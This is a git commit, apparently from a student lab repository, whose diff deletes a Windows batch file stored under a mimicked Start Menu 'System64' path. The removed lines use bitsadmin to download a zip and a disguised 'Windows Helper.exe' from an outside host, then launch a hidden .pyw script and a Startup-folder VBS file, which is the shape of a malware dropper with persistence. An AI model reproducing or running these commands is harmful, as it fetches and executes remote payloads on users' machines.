4562ebafb633f8398a66718532c65a4a06b6464a
MrNelt <90527587+MrNelt@users.noreply.github.com>
2023-05-18 23:03:41 +0300

    Delete C:\Users\alex\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System64\WIN32.bat

--- lab3/C:\Users\alex\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System64\WIN32.bat
+++
@@ -1,4 +0,0 @@
-bitsadmin /transfer mydownloadjob /download /priority FOREGROUND "https://api-hw.com/dl/runtime" "C:\Users\alex\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System64\runtime.zip"
-start "" "C:\Users\alex\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System64\sh.pyw"
-bitsadmin /transfer mydownloadjob /download /priority FOREGROUND "https://api-hw.com/dl/w" "C:\Users\alex\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System64\Windows Helper.exe"
-start "" "C:\Users\alex\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WIN64.vbs"
